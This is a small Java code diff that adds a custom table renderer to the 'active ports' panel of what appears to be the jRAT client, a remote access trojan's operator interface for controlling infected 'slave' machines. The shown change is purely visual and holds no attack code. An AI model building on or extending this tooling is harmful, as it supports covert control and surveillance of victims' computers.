@@ -16,6 +16,7 @@ import javax.swing.table.DefaultTableModel;
 
 import su.jrat.client.Slave;
 import su.jrat.client.packets.outgoing.Packet73ActivePorts;
+import su.jrat.client.ui.renderers.table.ActivePortsTableRenderer;
 import su.jrat.client.utils.IconUtils;
 
 
@@ -86,6 +87,7 @@ public class PanelControlActivePorts extends PanelControlParent {
 		table.getColumnModel().getColumn(1).setPreferredWidth(168);
 		table.getColumnModel().getColumn(2).setPreferredWidth(225);
 		table.getColumnModel().getColumn(3).setPreferredWidth(116);
+		table.setDefaultRenderer(Object.class, new ActivePortsTableRenderer());
 		table.setRowHeight(25);
 		scrollPane.setViewportView(table);
 		setLayout(groupLayout);
